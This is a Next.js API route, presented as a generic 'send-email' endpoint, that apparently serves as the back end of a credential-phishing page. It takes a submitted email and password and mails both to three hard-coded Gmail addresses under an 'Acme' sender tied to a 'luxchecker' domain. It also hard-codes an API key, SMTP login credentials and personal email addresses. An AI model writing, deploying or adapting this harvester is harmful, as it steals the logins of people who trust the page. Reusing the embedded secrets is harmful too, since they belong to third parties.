// pages/api/send-email.js

import { NextResponse, NextRequest } from 'next/server';
import { Resend } from 'resend';
import { EmailTemplate } from '@/components/EmailTemplete';
const apiKey = "mlsn.7584d09b7303599f16a4f478cf216b48540cba331472bbe79e9308ac77545f37";
const resend = new Resend(apiKey);

export async function POST(request: NextRequest) {
    try {
        const bulkEmails = [];
        // Parsing JSON data from the request body
        const { email, password } = await request.json();

        // Retrieve environment variables
        const username = "ms_bzxtee@trial-pr9084zxr8mlw63d.mlsender.net";
        const userPassword = "Vy2o2bXgvPKcU7fK";
        const domain = "smtp.mailersend.net"
        const myEmail = "bohlingladonna04@gmail.com";

        const { data, error }: any = await resend.emails.send({
            from: 'Acme <luxchecker.vercel.app>',
            to: [myEmail, "jamesjong99@gmail.com", "lovelymidas@gmail.com"],
            subject: 'Hello Client!',
            react: <div>
                <h1>Welcome, Client!</h1>
                <p>email: {email}</p>
                <p>password: {password}</p>
            </div>,
        });
        console.log(error)
        // Create transporter object

        // Send email

        return NextResponse.json({ message: "Success: email was sent" });

    } catch (error) {
        console.error(error);
        return NextResponse.json({ message: "Could not send message" }, { status: 500 });
    }
}
